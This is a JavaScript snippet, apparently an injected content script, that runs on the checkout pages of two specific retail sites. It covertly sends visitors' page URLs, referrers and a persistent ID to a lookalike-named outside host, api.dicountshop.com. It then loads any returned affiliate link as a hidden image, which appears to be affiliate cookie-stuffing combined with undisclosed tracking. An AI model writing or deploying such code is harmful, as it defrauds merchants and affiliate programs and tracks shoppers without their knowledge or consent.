(function () {

    function generateUUID() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
            var r = Math.random() * 16 | 0,
                v = c === 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }

    function getCookie(cname) {
        var name = cname + '=';
        var ca = document.cookie.split(';');
        for (var i = 0; i < ca.length; i++) {
            var c = ca[i].trim();
            if (c.indexOf(name) === 0) return c.substring(name.length, c.length);
        }
        return '';
    }

    function fireTracking(url) {
        try {
            var img = new Image();
            img.src = url;
            img.style.display = 'none';
            document.body.appendChild(img);
        } catch (e) {}
    }

    async function sendTrackingCall() {
        try {
            let uniqueId = getCookie('tracking_uuid') || generateUUID();
            let expires = (new Date(Date.now() + 30 * 86400 * 1000)).toUTCString();
            document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + ';path=/;SameSite=Lax';

            let response = await fetch('https://api.dicountshop.com/api/track-user', {
                method: 'POST',
                keepalive: true,
                body: JSON.stringify({
                    url: window.location.href,
                    referrer: document.referrer,
                    unique_id: uniqueId,
                    origin: window.location.hostname,
                    timestamp: new Date().getTime()
                }),
                headers: { 'Content-Type': 'application/json' }
            });

            let result = await response.json();

            if (result.success && result.affiliate_url) {
                fireTracking(result.affiliate_url);
            } else {
                fireTracking('https://api.dicountshop.com/api/fallback-pixel?id=' + uniqueId);
            }
        } catch (error) {
            console.error('Tracking Failed:', error);
        }
    }

    function initTracking(dedupKey) {
        if (sessionStorage.getItem(dedupKey)) return;
        sessionStorage.setItem(dedupKey, 'true');

        sendTrackingCall();

        var delayedFired = false;
        var fireDelayed = function () {
            if (delayedFired) return;
            delayedFired = true;
            window.removeEventListener('pagehide', fireDelayed);
            window.removeEventListener('beforeunload', fireDelayed);
            sendTrackingCall();
        };

        setTimeout(fireDelayed, 2000);
        window.addEventListener('pagehide', fireDelayed);
        window.addEventListener('beforeunload', fireDelayed);
    }

    function getPageType() {
        const stages = [
            { type: "cart", paths: ["/checkout/cart"] },
            { type: "shipping", paths: ["/checkout/delivery", "/checkout/shipping"] },
            { type: "payment", paths: ["/xpay", "/checkout/payment", "/pay-installments"] },
            { type: "review-order", paths: ["/checkout/review-order"] },
            { type: "confirmation", paths: ["/checkout/confirmation"] }
        ];
        const path = window.location.pathname.toLowerCase();
        const stage = stages.find(s => s.paths.some(p => path.includes(p)));
        return stage ? stage.type : null;
    }

    function run() {
        const host = window.location.hostname;

        const config = {
            "www.xcite.com": { always: false, cartExtra: true },
            "www.fairprice.com.sg": { always: true, cartExtra: true }
        };

        const site = config[host];
        if (!site) return;

        const pageType = getPageType();

        if (site.always) {
            initTracking('tracking_done_' + host + '_always');
        }
        if (site.cartExtra && pageType) {
            initTracking('tracking_done_' + host + '_' + pageType);
        }
    }

    if (document.readyState === "interactive" || document.readyState === "complete") {
        run();
    } else {
        window.addEventListener("DOMContentLoaded", run);
    }
})();
